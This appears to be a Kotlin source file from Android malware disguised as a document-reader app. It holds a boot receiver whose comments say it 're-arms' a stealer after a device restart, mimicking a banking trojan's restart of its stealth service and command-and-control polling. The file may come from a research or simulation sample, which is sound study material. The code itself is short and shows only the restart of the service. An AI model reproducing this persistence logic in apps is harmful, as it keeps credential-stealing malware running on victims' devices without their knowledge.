package com.docreader.lite.reader

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

/**
 * Boot persistence — re-arms stealer on device restart.
 * Real banker: restarts FG service + C2 polling immediately on boot.
 */
class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED ||
            intent.action == Intent.ACTION_MY_PACKAGE_REPLACED) {
            // Restart stealth service → re-arms everything
            BackgroundSyncService.start(context)
        }
    }
}
